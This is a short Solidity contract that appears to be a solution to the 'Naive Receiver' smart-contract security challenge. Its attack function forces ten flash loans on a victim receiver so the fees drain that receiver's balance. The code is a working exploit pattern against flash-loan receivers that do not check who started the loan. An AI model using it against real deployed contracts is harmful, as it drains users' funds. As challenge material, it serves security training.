// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool private pool;

    //set pool
    constructor(address payable _poolAddress) {
        pool = NaiveReceiverLenderPool(_poolAddress);
    }

    function attack(
        IERC3156FlashBorrower _recipient,
        address token,
        uint256 amount,
        bytes calldata data
    ) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(_recipient, token, amount, data);
        }
    }
}
